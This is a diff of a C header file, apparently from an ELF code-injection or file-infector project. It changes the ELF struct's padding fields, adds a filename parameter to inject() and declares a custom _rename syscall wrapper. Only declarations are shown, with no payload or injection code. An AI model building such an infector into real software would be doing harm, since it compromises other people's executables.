@@ -33,8 +33,6 @@
 
 #define BUFF_SIZE 1024*1024*5
 
-#define VOID __attribute__((unused))
-
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
 ////////////////////////////////////////////////////////////////////////////////
@@ -60,12 +58,11 @@ struct elf
 	void *ptr;
 	unsigned long long size;
 
-	Elf64_Ehdr *header;
 	Elf64_Phdr *note;
 	Elf64_Phdr *data;
 
-	int addr_padding;
-	int offs_padding;
+	unsigned long long addr_padding;
+	unsigned long long offs_padding;
 };
 
 struct criteria
@@ -90,7 +87,7 @@ void modify_segments(struct elf *file);
 void modify_header(struct elf *file);
 
 // INJECT_C
-void inject(const struct elf *file);
+void inject(const struct elf *file, const char *filename);
 
 // FILE_C
 struct elf get_file(const char *str);
@@ -104,6 +101,7 @@ int _stat(const char *pathname, struct stat *statbuf);
 int _getuid(void);
 void *_mmap(void *addr, unsigned long length, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
 int _munmap(void *addr, unsigned long length);
+int _rename(const char *oldpath, const char *newpath);
 
 // UTILS_C
 unsigned long _strlen(const char *str);
